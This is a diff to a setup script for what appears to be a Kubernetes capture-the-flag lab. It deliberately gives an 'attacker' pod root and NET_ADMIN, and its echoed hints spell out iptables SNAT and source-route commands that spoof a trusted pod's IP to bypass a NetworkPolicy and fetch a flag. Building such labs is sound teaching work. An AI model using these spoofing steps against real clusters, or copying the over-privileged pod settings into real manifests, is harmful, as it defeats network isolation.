@@ -9,8 +9,9 @@ k8s_init
 k8s_create_host_flag
 k8s_create_cluster
 k8s_wait_ready
+k8s_install_calico
 
-k8s_load_images alpine:latest
+k8s_load_images alpine:latest nicolaka/netshoot:latest
 
 k8s_apply << 'YAML'
 apiVersion: v1
@@ -84,12 +85,19 @@ kind: Pod
 metadata:
   name: attacker-pod
   namespace: untrust-zone
+  labels:
+    app: attacker
 spec:
   containers:
     - name: attacker
-      image: alpine:latest
+      image: nicolaka/netshoot:latest
       imagePullPolicy: IfNotPresent
       command: ["sleep", "3600"]
+      securityContext:
+        runAsUser: 0
+        capabilities:
+          add:
+            - NET_ADMIN
 ---
 # Allowed pod in trust-zone (whitelisted IP)
 apiVersion: v1
@@ -119,9 +127,15 @@ echo "    Flag in: flag-pod (trust-zone, IP-restricted)"
 echo "    Allowed IP: $TRUSTED_IP"
 echo "    Flag service: flag-svc.trust-zone.svc.cluster.local:8080"
 echo ""
-echo "    Exploit: Spoof the trusted pod's IP to bypass NetworkPolicy"
-echo "    kubectl exec -n untrust-zone attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0"
-echo "    kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
+echo "    Exploit: Spoof the trusted pod's source IP to bypass the ipBlock policy"
+echo "    (attacker pod is misconfigured with CAP_NET_ADMIN - the real finding)"
+echo "    1. SNAT to the trusted IP (iptables available via netshoot):"
+echo "       kubectl exec -n untrust-zone attacker-pod -- iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source $TRUSTED_IP"
+echo "       kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
+echo "    2. Alternative - secondary IP + source-route selection:"
+echo "       kubectl exec -n untrust-zone attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0"
+echo "       kubectl exec -n untrust-zone attacker-pod -- ip route add ${FLAG_IP}/32 dev eth0 src $TRUSTED_IP"
+echo "       kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
 echo ""
-echo "    Or use IPTables to rewrite source IP:"
-echo "    kubectl exec -n untrust-zone attacker-pod -- iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source $TRUSTED_IP"
+echo "    Note: NetworkPolicy ipBlock trusts the source IP; CAP_NET_ADMIN lets the"
+echo "    pod rewrite it. This is a pod capability misconfiguration."
